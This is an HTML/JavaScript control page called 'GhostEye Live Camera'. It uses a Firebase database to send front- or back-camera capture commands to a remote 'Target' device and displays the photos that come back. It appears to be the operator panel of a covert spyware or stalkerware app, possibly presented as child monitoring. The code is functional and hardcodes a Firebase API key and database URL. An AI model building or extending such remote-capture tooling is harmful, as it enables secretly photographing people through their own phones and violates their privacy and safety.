<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostEye Live Camera</title>
    
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js"></script>
    <script type="module" src="https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        body { background-color: #050505; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; }
        
        .header { padding: 15px; background: #111; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; }
        .back-btn { color: #ccc; text-decoration: none; font-size: 1.2rem; }
        .status { font-size: 0.9rem; color: #00ff88; font-weight: bold; }

        .cam-container {
            flex: 1; display: flex; justify-content: center; align-items: center; 
            background: #000; position: relative; overflow: hidden;
        }
        
        #liveImage { width: 100%; height: 100%; object-fit: contain; display: none; }
        .placeholder { color: #333; font-size: 1.2rem; text-align: center; }

        .controls {
            padding: 20px; background: #111; border-top: 1px solid #333;
            display: flex; justify-content: space-around;
        }
        
        .btn {
            background: #222; color: white; border: 1px solid #444; 
            padding: 15px 25px; border-radius: 10px; cursor: pointer; 
            font-size: 1rem; display: flex; flex-direction: column; align-items: center; gap: 5px;
            transition: 0.2s; width: 40%;
        }
        .btn:active { transform: scale(0.95); background: #00ff88; color: black; }
        .btn i { font-size: 1.5rem; }

        /* Loader */
        .loader { display: none; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #00ff88; }
    </style>
</head>
<body>

    <div class="header">
        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
        <span class="status" id="connStatus">Connecting...</span>
    </div>

    <div class="cam-container">
        <div class="placeholder" id="placeholderMsg">
            <i class="fa-solid fa-camera fa-3x"></i><br><br>
            Waiting for Camera...
        </div>
        <div class="loader" id="loader"><i class="fa-solid fa-spinner fa-spin fa-2x"></i></div>
        <img id="liveImage" src="" alt="Camera Feed">
    </div>

    <div class="controls">
        <button class="btn" onclick="requestPhoto('0')">
            <i class="fa-solid fa-camera"></i> Back Cam
        </button>
        <button class="btn" onclick="requestPhoto('1')">
            <i class="fa-solid fa-camera-rotate"></i> Front Cam
        </button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getDatabase, ref, onValue, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        // âœ… Firebase Config (Tumhari wali)
        const firebaseConfig = {
            apiKey: "AIzaSyDs5ubX4MGyVoCHIJXXgWBpU7wgoS5jcDM",
            authDomain: "childapp-ce1fe.firebaseapp.com",
            databaseURL: "https://childapp-ce1fe-default-rtdb.firebaseio.com",
            projectId: "childapp-ce1fe",
            storageBucket: "childapp-ce1fe.firebasestorage.app",
            messagingSenderId: "108035285372",
            appId: "1:108035285372:web:generated_placeholder"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Get ID from URL or Storage
        const urlParams = new URLSearchParams(window.location.search);
        let deviceId = urlParams.get('id') || localStorage.getItem('ghost_device_id');
        
        if(!deviceId) {
            alert("No Device ID selected!");
            window.location.href = 'index.html';
        }

        document.getElementById('connStatus').innerText = "Target: " + deviceId;

        // ðŸ”¥ LISTEN FOR PHOTO UPDATES
        const imgRef = ref(db, 'live_cameras/' + deviceId + '/image');
        
        onValue(imgRef, (snapshot) => {
            const base64 = snapshot.val();
            if(base64) {
                const imgTag = document.getElementById('liveImage');
                imgTag.src = "data:image/jpeg;base64," + base64;
                imgTag.style.display = "block";
                document.getElementById('placeholderMsg').style.display = "none";
                document.getElementById('loader').style.display = "none";
            }
        });

        // ðŸ”¥ SEND COMMAND FUNCTION
        window.requestPhoto = function(camType) {
            console.log("Requesting Camera: " + camType);
            
            // UI Feedback
            document.getElementById('loader').style.display = "block";
            
            // Send Command to Firebase
            // App me listener lagana padega "live_cameras/ID/command" par
            set(ref(db, 'live_cameras/' + deviceId + '/command'), {
                action: camType === '1' ? 'capture_front' : 'capture_back',
                timestamp: Date.now()
            });
        }
    </script>
</body>
</html>
